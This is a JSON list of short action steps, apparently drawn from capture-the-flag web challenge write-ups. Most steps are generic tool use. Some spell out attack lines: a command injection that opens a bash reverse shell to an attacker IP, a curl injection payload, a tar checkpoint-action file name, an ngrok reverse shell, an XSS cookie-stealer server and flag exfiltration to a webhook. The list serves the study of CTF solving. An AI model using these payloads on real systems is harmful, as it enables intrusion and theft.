[
    "Used shell access to browse the file system.",
    "Identified notable shell script 'findaas' inside '/ctf'.",
    "Executed './findaas flag.txt' command.",
    "Attempted to read the flag using 'cat ./system/of/a/down/flag.txt'.",
    "Executed 'cat ./system/of/a/down/flag.txt' command.",
    "Constructed a command to be executed",
    "Slept for half a second",
    "Focus on the command line subprocess interaction.",
    "Open the cURL tool",
    "Execute the command 'curl -H \"Accept-Language: sv-SE\" very.uniquename.xyz:8880'",
    "Open cURL.",
    "Decided to write a script to automate the process",
    "Wrote a Python script to automate the requests",
    "The author sets up the environment to exploit the SQL Injection challenge.",
    "The iterated character is added to the 'flag'.",
    "Wrote a python script",
    "The script automates the process",
    "Use the 'subprocess.Popen' class.",
    "Start a 'netcat' listener on your server.",
    "Gain a shell.",
    "List the directory.",
    "Use Python's requests library",
    "Run the Python script.",
    "Launch terminal.",
    "Set up a simple Node.js server backend.",
    "Create a PHP file named 'payload.php'",
    "Start the challenge instance.",
    "Open Postman or a similar tool for sending HTTP requests.",
    "Cloned the GitHub repository.",
    "Discovered a Dockerfile.",
    "Started the app with 'PORT=8080 npm run start'",
    "Restarted the container.",
    "Searched for the flag using 'ls /'.",
    "Used the command 'cat /flag.txt' as part of the URL parameter.",
    "Noticed the output of 'List Storage' command runs 'df -h'.",
    "Constructed command '/santa_mon.sh \"curl http://localhost:3000/get_flag\"'.",
    "Start the Flask python server with 'python xss-cookie-stealer.py' and then run '/ngrok http 16361'.",
    "Wait for a few seconds for the puppeteer instance to start and load the page.",
    "Use the Python subprocess library's getoutput() function.",
    "Use curl command",
    "Open the file index.html.",
    "Download app.py",
    "Install and open Dirb tool",
    "Run a script with the site's 'secret key' included.",
    "Use a Python script to brute force the password",
    "Executed the cURL command",
    "Build the token using NodeJS",
    "Use the 'jsonwebtoken' library",
    "Open jwt_tool.",
    "Specify 'rockyou.txt' as the dictionary file.",
    "Locate the .env file",
    "Develop a Python script",
    "Use the script available at https://github.com/lijiejie/ds_store_exp.",
    "Create a client script based on packet structure knowledge.",
    "Execute the developed script.",
    "Use 'dirb' tool",
    "Use an editor",
    "Used PHP system() function.",
    "Executed commands.",
    "Executed 'id' command.",
    "Executed 'ls -al' command.",
    "Listed the directory contents.",
    "Executed 'cat index.php' command.",
    "Use PHP system() function",
    "Execute commands",
    "Execute 'id' command",
    "Execute 'ls -al' command",
    "Execute 'cat index.php' command",
    "Wrote a Python script.",
    "Implemented a condition in the Python script.",
    "Unquoted and cleaned up the cookie values within the Python script.",
    "Used the value ':wq' for the 'exit' parameter.",
    "Used the value ':wq' for the 'exit' parameter.",
    "Create a Python script",
    "Design the script to automate the trial and error process",
    "Use the identified class (subprocess.Popen) to list directory content",
    "List directory content remotely using the identified class",
    "Execute the crafted payload",
    "Use the 'glob' function to find interesting files",
    "Use the tool 'git-dumper'.",
    "Use the 'git diff' command.",
    "Use the 'git checkout' command.",
    "Specify the previous commit that contained the flag ('flag.jpg').",
    "Upload the modified DOCX file",
    "Used provided hexadecimal values.",
    "URL encoded the first binary string.",
    "URL encoded the second binary string.",
    "Use jwt.io tool",
    "Download the PCAP file.",
    "Craft a request",
    "Used the provided code snippet.",
    "Launch remote commands using the Python script.",
    "Check the output of the command \"whoami\".",
    "List the files.",
    "Create PHP payload",
    "Use the output of the script.",
    "Execute '/bin/ls .'",
    "Use the curl command",
    "Use the curl command",
    "Use 'git clone https://github.com/sa7mon/S3Scanner.git'",
    "Use 'cd S3Scanner/'",
    "Modify permissions of s3scanner.py",
    "Use 'chmod u+x s3scanner.py'",
    "Install the required dependencies for s3scanner",
    "Use 'pip install -r requirements.txt'",
    "Use 'python3 ./s3scanner.py --dump bucketsoffun-ctf.s3-website-us-east-1.amazonaws.com'",
    "Use 'cd buckets/bucketsoffun-ctf/'",
    "View the contents of the directory",
    "Use 'll'",
    "Identify the usage of exiftool",
    "Attempt to find the current working directory.",
    "Utilize the '/proc/self/' directory.",
    "Access the reference to the current working directory using 'cwd/'.",
    "Create a local repository.",
    "Initialise a local Bazaar repository.",
    "Set the script to continue downloading missing files.",
    "Created a new directory titled 'ctf-bzr'",
    "Initialized a Bazaar repository within the 'ctf-bzr' directory",
    "Ran the 'bzr status' command on the 'ctf-bzr' repository.",
    "Ran the 'bzr revert' command to restore the 'index.php' file.",
    "Write a Python script to automate the URL enumeration and flag discovery.",
    "Replace each integer into a URL.",
    "Write a Python script that automates this process",
    "Obtain the text 'cat index.txt'.",
    "Print the 'flag' file content using a bash script.",
    "Construct a Python script.",
    "Automate the process of discovering the next character in the password.",
    "Run the script.",
    "Successfully restore the source code files on local machine.",
    "Wrote a script to use a cache.",
    "Ensured the cache stores all attempts for generating the challenge strings.",
    "Lacked the knowledge on how to trigger the aforementioned error.",
    "Duplicate the server environment.",
    "Set up a redis server.",
    "Create a final script to send the command for flag extraction to the server.",
    "Simultaneously wrote a Python script",
    "Set up a PHP script on '/pleb.my.ip.nip.io'.",
    "Use the X-Accel-Redirect PHP script.",
    "Create a working script",
    "Understand the need to create a controlled filename.",
    "Write a PHP script",
    "Execute the brute force PHP script",
    "Use YAML to analyze the script.",
    "Start a new process.",
    "Use 'JsonCookies' to create a json object",
    "Run command line script using curl",
    "Inside the new HTML script element, decide to add an 'imports' key",
    "Set the 'imports' key to map '/js/ast-to-js.mjs' to '/js/eval-code.mjs'",
    "Successfully obtain the flag.",
    "Move into burp suite.",
    "Use version 43.0 for the user-agent string.",
    "Wrote the received response to stdout.",
    "Set up a Python-based environment.",
    "Verified the shellcode's functionality and ensured compatibility with the `strlen()` function within 'shellme()' in the `shellme.so` file.",
    "Use the Proof of Concept script",
    "Led to the Flask.app object",
    "Executed the Python script",
    "Using the command: python3 -m flask run",
    "Use Python-random-module-cracker tool",
    "Open curl in terminal or command line.",
    "Begin to test this theory with 'handlebars', a tool which previously had a known vulnerability in processing templates.",
    "Automate the process through script.",
    "Use burp tool to execute the interception.",
    "Caused Apache2 to crash due to ':' in directory name.",
    "Used a bash script to extract the PHPSESSID with auth set.",
    "Used distinct virtual hosts and shell wildcards for the same result.",
    "Use the ipaddress library in Python to check the IP address.",
    "Consider using a tool like singularity to set up a DNS server.",
    "Configure the burpsuite tool.",
    "Start the burpsuite tool.",
    "Send the content of flag.txt to a webhook.",
    "Able to run shell commands.",
    "Checked the docker files.",
    "Saved the request.",
    "Switch to the console.",
    "Perform the 'cat' command on '/home/user/flag.txt'.",
    "Create a Python script to automate the process.",
    "Using Accessibility Tool",
    "Launch BurpSuite.",
    "Submit the input.",
    "Used the command: nikto -h http://172.17.15.117:443/",
    "Use Burp Suite to pass the password despite the character limit",
    "Execute the 'ls ../' command to check the parent directory.",
    "Used curl command",
    "Add a random timestamp to the POST request body to understand the format.",
    "Update the timestamp in the POST request.",
    "Locate the '.git' directory via robots.",
    "Use the internetwache GitTools.",
    "Generate a custom wordlist of potential log file names.",
    "Execute wget to download all available logs.",
    "Used Burpsuite",
    "Uploaded changes",
    "Output the password string and the trimmed section of the server response.",
    "Open the command line tool.",
    "Open Python.",
    "Open Python.",
    "Take a URL as an argument.",
    "Encode the solution string using base64 to generate the 'userdata' parameter.",
    "Loop through a list of characters.",
    "Note that the server does not have CURL.",
    "Use a python script to send requests.",
    "Write a Python script to automate the process.",
    "Use the 'requests' library to send HTTP GET requests.",
    "Create a for loop to iterate through the numbers from 1 to 20.",
    "Use btoa javascript function.",
    "Create a script to generate the JWT payload.",
    "Copy the output",
    "Use Burp Suite.",
    "Create the file '--checkpoint-action=exec=sh shell.txt'.",
    "Generate a file with random content.",
    "Verify the current size of the tar archive.",
    "Used the command 'sqlmap -r invoice.req --tamper tamper.py --threads 10 -T news_article --dump'.",
    "Set permissions of the 'id' file to 777",
    "Exported '/tmp' to the PATH",
    "Build a HTML page to automate this process.",
    "Use the 'tryNumber' function.",
    "Create a Python script.",
    "Use inline commands of Redis to send commands directly.",
    "Utilize the web shell to gain access to the file system.",
    "Observe that due to request length limits around 3000 queries are batched at a time.",
    "Write script to automate this process of generating payloads and making POST requests.",
    "Note that every 3000 attempts, the CAPTCHA code needs to be updated manually in the script.",
    "Encoded the contents of the retrieved file in base64 format for smooth transfer without encoding issues",
    "Set up a local HTTP proxy using cURL to accommodate the complex GET request.",
    "Use Python scripting to manipulate the PDF files.",
    "Use the 'mutool' command to manipulate the PDF files.",
    "Create 'merged.pdf' containing a dummy PDF.",
    "Include the chosen input PDFs in the 'merged.pdf'.",
    "Create 'collision1.pdf' with the predetermined prefix.",
    "Create 'collision2.pdf' with the predetermined prefix.",
    "Use the 'mutool info -X' command to verify 'collision1.pdf'.",
    "Use the 'mutool info -X' command to verify 'collision2.pdf'.",
    "Write a script to bruteforce each of the hardcoded cookie names.",
    "Use hashlib, URLSafeTimedSerializer and TimestampSigner in Python.",
    "Deployed the previously developed JavaScript payload.",
    "Set one of the usernames as '{{ add_money_to_login(USERNAME, AMOUNT_OF_MONEY) }}'",
    "Compose an SMS message",
    "Navigate to the uploaded webshell.",
    "Use the command 'python nodejsshell.py 2.tcp.ngrok.io 13755' to generate a reverse shell payload for the ngrok tunnel.",
    "Copy the output from the crafted reverse shell payload.",
    "Download the `openapi.json` file.",
    "Create a zip file.",
    "Add a `run` bash script to the zip file.",
    "Upload the zip file.",
    "Setup a request",
    "Set up a remote server for this purpose.",
    "Deploy this page on a server.",
    "Point the 'screenshotter' service to the deployed page.",
    "Create the server script.",
    "Write the port number used to a file to keep track.",
    "Utilize https://jwt.io/ or a JWT-signing library for the JWT creation.",
    "Used Remote Flutter Widgets package for decoding.",
    "Run the Python script.",
    "Execute '/usr/bin/strings /readflag' command.",
    "Run script.",
    "Noted the use of DOMPurify for HTML sanitization.",
    "Deployed the GitHub repository to GitHub pages under a '.jsapi.tech' subdomain.",
    "Created an attacker server.",
    "Configured the attacker server to make 19 redirects.",
    "Utilized script to make the client request.",
    "Used AWS CLI to access the 'palindromecloudynekos' S3 bucket",
    "Deployed the Python script as a Lambda function",
    "Invoked the Lambda function",
    "Gained a reverse shell by invoking the Lambda function",
    "Created an EC2 instance using the new role",
    "Configured the EC2 instance to trigger a reverse shell on startup",
    "Automate the submission of different text fragments.",
    "Automate the full exploit chain in solve.py.",
    "Receive the flag on the attacker server.",
    "Validate the files with SHA256 sums",
    "Run the command 'python3 payload.py | nc localhost 8000'.",
    "Include request body with 'logging' attribute set to true.",
    "Initialized a server to exploit the above vulnerability.",
    "Realized that Chrome DevTools can be used for debugging and obtaining the required information.",
    "Used 'php://filter' again.",
    "Located 'flag.txt'.",
    "Note that filename restrictions need to be bypassed to get the flag",
    "Prepared my server for listening with netcat",
    "Set up a netcat listener on my server",
    "Created a payload using python pickle containing a command execution statement",
    "Read the just created payload",
    "Sent the payload to the challenge webpage URL using a POST request",
    "Open the function addCaptcha() in the devtools",
    "Change the HTTP method to POST.",
    "Add 'messi' as a key in the JSON object in the HTTP request.",
    "Change the value of the 'messi' key to 'psg'.",
    "Implemented a logic that changes the cookie flag each time a request is made",
    "Spawn a reverse shell.",
    "Specify the port number.",
    "Run a command to convert the base64 string to ASCII.",
    "Identify the application.",
    "Used a private SSH key retrieved from the database for cloning.",
    "Customize the request body.",
    "Injected '127.0.0.1;bash -c bash -i >& /dev/tcp/<attack-ip-with-netcat-open>/<attacker-netcat-port> 0>&1'.",
    "Attempted to open a reverse shell.",
    "Failed at multiple attempts to get reverse shell.",
    "Attempts to open a reverse shell modified the PHP file.",
    "Search for a way to call a function without parentheses.",
    "Attempt a brute-forcing approach.",
    "Viewed source code and observed 'shell_exec' usage with 'santa_mon.sh' script.",
    "Chose to craft a spaceless command injection payload.",
    "Finalized the payload as 'http://IP:PORT/?command=%22curl${IFS}http://localhost:3000/get_flag%22'.",
    "Replace the JWT token with the admin token.",
    "A Python Flask application, does this in 'xss-cookie-stealer.py'. This script defines one route, '/', which reads the 'c' parameter in the request URL, opens a file called 'cookies.txt', writes the contents of 'c' parameter to that file, and then redirects to 'https://google.com'.",
    "You can run this script anywhere that is internet accessible, port forward port '16361' or deploy on Google Cloud. But, the easiest method is to use ngrok.",
    "Locate the file 'build_flag_checker.yml'",
    "Analyze the contents of 'build_flag_checker.yml'",
    "Open the 'flaghash.sh' script",
    "Write a LaTeX script.",
    "Run Dirb to scan for hidden directories or files",
    "Open the final.txt file in the path",
    "Created a Python script for a brute-force attack on the prefix.",
    "Accessed files such as '.git/HEAD'",
    "Used dumper from GitTools to inspect the git repo",
    "Initiate brute force attack on the token.",
    "Research the hashpumpy function",
    "Extract the source code from /src.tgz.",
    "Or, use Wireshark for analyzing the HTTP traffic.",
    "Utilize the requests library in Python for communication.",
    "Code the script to play the game repeatedly.",
    "Search for the flag within the script's output.",
    "Added a header named 'answer'",
    "Retrieve content of index.php file",
    "Script retrieves all characters.",
    "Implemented a loop in the Python script.",
    "Script iteratively reads the transmissions.",
    "Revealed that a 'vim' command must be used.",
    "Execute the Python script",
    "Sign the JWT with 'dawgCTF?heckin#bamboozle' secret",
    "Calculate the 'passcode'.",
    "Include /var/www/html/flag.php in the POST request",
    "Updated length of URL string according to the previous string replacement.",
    "Retrieve the flag from the file \"flag.txt\".",
    "Craft a URL using the identified character.",
    "Observe the form field requesting an IP address.",
    "Use the 'strings' command to extract the flag from the binary data in the 'print-flag' file.",
    "Use S3Scanner to dump the contents of the suspect S3 bucket",
    "Append the new HMAC signature to the header and payload.",
    "Download the provided PHP files",
    "Find the flag file in the current working directory.",
    "Generate more base64 cookies.",
    "Base64 encode the filenames `index.php` and `getimg.php`.",
    "Pull multiple .git files such as `.git/index`, `.git/config`, `.git/HEAD` etc., from the server.",
    "Identify the debugging private key.",
    "Wrote a request to the root directory",
    "The script reads from '/mydank'",
    "Create a request for '/admin../uberadmin/flag.txt'.",
    "Replace parentheses with backticks in the script",
    "Open the source.zip file.",
    "Import 'io/ioutil'.",
    "Import 'os'.",
    "Obtain an exploit script for generating the payload.",
    "Configure the exploit script with the necessary parameters.",
    "Execute the exploit script to generate the payload.",
    "Construct a curl command to send the payload to the server.",
    "Execute the curl command to send the payload to the server.",
    "Provide an empty array for 'variables'",
    "Utilize hardcoded key.",
    "Highlighted 'ExtFilterDefine 7f39f8317fgzip mode=output cmd=/bin/gzip'.",
    "Determined that the function `shellme()` is defined in the shared object `shellme.so`.",
    "Utilized the environment to assemble and debug shellcode.",
    "Used the script from https://github.com/PequalsNP-team/pequalsnp-team.github.io/blob/master/assets/search.py",
    "Compose a POST request for the server's login endpoint.",
    "Send the composed POST request via curl.",
    "The 'User-Agent header' showed the admin uses 'Firefox 61.0'",
    "This page is the admin's tool for changing 'user status' to 'premium'",
    "Determine that the length of the flag is 38 characters.",
    "Make the first GET request: 'GET https://yeunote.ctf.yeuchimse.com/note/twitter/3'.",
    "Intercept data between the server and the client.",
    "Gather supporting materials for the exploit",
    "Run the exploit with the specified phar file",
    "Develop a Python script to automate the brute-forcing of characters.",
    "Search for related pull requests on github.",
    "Export or send the content of flag.txt.",
    "Use sqlmap tool.",
    "Apply sqlmap on the saved login request.",
    "Send a post request with the payload for every possible character in the flag.",
    "If a correct character is found (indicated by a read timeout), append the character to the flag and move to the next character.",
    "Utilize the observed character set.",
    "Combine it with the input of three commas to meet the requirement.",
    "Used Burp Suite to intercept the login request",
    "Enclose 'ls' command in backticks.",
    "Add a random rocket name to the POST request body.",
    "Assign 'triton' as the rocket name in the POST request body.",
    "Execute ffuf to fuzz the challenge site.",
    "Utilize the custom wordlist to find more logs.",
    "Found a link for an example json file",
    "Append the current character to the password string.",
    "Trim a section of the server response using slicing.",
    "Launch Python.",
    "Import the 'md5' function from 'hashlib' in Python.",
    "Use the '.lower()' method on the variable to convert the string to lowercase.",
    "Write a Python script to automate the extraction of hidden fields from the website's HTML.",
    "Create a script.",
    "Identify remote address and user agent checks as the reasons.",
    "Determine the need to use '/home/stypr/readflag' on 'website'.",
    "Use Fetch API on 'mobile-viewer' page.",
    "Base64 encode the private key.",
    "Observe the received Base64 encoded string.",
    "Send a POST request to the '/localization-language' endpoint.",
    "Access the GET request arguments through `request.args`",
    "Use a Python script to find `<class 'subprocess.Popen'>` in the subclasses",
    "Create a file 'shell.txt'.",
    "Add the desired payload to 'shell.txt'.",
    "Ensure the file is empty.",
    "Create a file of 1024 bytes with a random name ending in '.txt'.",
    "Retrieved the flag 'CSR{sometimes_it's_really_hard_to_create_good_flags}'.",
    "Created a bash script",
    "Translated the bash script into a one-liner",
    "Ran 'insecure' to obtain a root shell",
    "Encode the payload using Python on the server.",
    "Create a JavaScript script within the HTML page.",
    "Open a window.",
    "Guess a number based on the window's history length.",
    "Specify the number range to be checked.",
    "Wrote a Python script to extract the most commonly occurring source IP (src_ip) from the CSV files",
    "fromCharCode() is utilized to avoid escaping quotes",
    "Utilized the `dirb` wordlist for username enumeration.",
    "Write an exploit script that creates an object with properties : 'username', 'password', '_correctValue' and 'mfa'. 'username' and 'password' are provided. '_correctValue' is set to NULL and 'mfa' is assigned the address of '_correctValue'. This ensures that 'mfa' and '_correctValue' are always identical.",
    "Include the cleaned, manipulated PDF data in 'collision1.pdf'.",
    "Include the cleaned, manipulated PDF data in 'collision2.pdf'.",
    "Invoke the 'render_template_string' function using the SMS message",
    "Trigger the 'add_money_to_login' function through the 'render_template_string' function",
    "Discover list of created books hosted on the server.",
    "Stored the '__proto__' key as ['__proto__'].",
    "Defined final payload using 'wget' and command substitution.",
    "The `run` bash script gives a reverse shell.",
    "Run the binary inside the docker container.",
    "Convert the image to text using OCR.",
    "Use the Runtime.evaluate method for sending the code.",
    "Pay particular attention to rules blocking longer payloads.",
    "Recognized the `onPressed` event handler `api_post`.",
    "Execute a Python script.",
    "Filter output using '/etc/alternatives/nawk'.",
    "Use character substitution to pass argument.",
    "Develop script for indexing and reconstructing.",
    "Create a Python script",
    "Specify an alphabet to iterate over",
    "Launch HTTP POST requests",
    "Include the SQL injection payload in the requests",
    "Experiment with different values in the SQL injection payload",
    "Wrote a script for the attack.",
    "Wrote a script using 'setTimeout' function.",
    "Executed the 'dig' command on 'asdf.jsapi.tech'.",
    "Added the CSS and generated CSS to a GitHub repository.",
    "Craft a file upload request with specific HTML content.",
    "Perform local test using a python command.",
    "Downloaded files from the 'palindromecloudynekos' S3 bucket",
    "Enumerated permissions using 'enumerate-iam' tool",
    "Enumerated permissions using 'pacu' tool",
    "Created a Python script that opens a reverse shell",
    "Initialize for loop.",
    "Set 'user.code' to a random 4-digit number.",
    "Experiment with creating a URL that just hits the length limit",
    "Retrieve source files for AsmBB and FreshLib using wget",
    "Unpack the tar archives",
    "Build the asmbb engine source code using the Fresh IDE with Linux as the target OS",
    "Write PHP payload to '/tmp/pwn.php'.",
    "Noticed that `$var8` is set immediately after `call $dlmalloc`."
]